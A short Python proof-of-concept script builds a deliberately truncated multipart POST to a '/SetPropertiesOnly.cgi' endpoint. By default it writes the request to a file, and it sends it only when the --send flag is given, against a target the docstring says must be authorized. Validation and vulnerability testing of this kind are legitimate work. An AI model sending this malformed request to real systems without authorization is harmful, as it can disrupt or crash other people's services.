#!/usr/bin/env python3
"""Generate the malformed multipart request used for validation.

The request is written to payload.bin by default. Network transmission requires
--send and must only be used against an authorized target.
"""
import argparse
import socket
from pathlib import Path

parser = argparse.ArgumentParser()
parser.add_argument("--host", default="127.0.0.1")
parser.add_argument("--port", type=int, default=10080)
parser.add_argument("--path", default="/SetPropertiesOnly.cgi")
parser.add_argument("--send", action="store_true")
args = parser.parse_args()

boundary = "BOUNDARY"
body = (
    f"--{boundary}\r\n"
    'Content-Disposition: form-data; name="prop"'
).encode()
request = (
    f"POST {args.path} HTTP/1.1\r\n"
    f"Host: {args.host}:{args.port}\r\n"
    f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
    f"Content-Length: {len(body)}\r\n\r\n"
).encode() + body

Path("payload.bin").write_bytes(request)
print(f"wrote {len(request)} bytes to payload.bin")

if args.send:
    with socket.create_connection((args.host, args.port), timeout=5) as sock:
        sock.sendall(request)
        try:
            print(sock.recv(4096))
        except socket.timeout:
            print("no response before timeout")
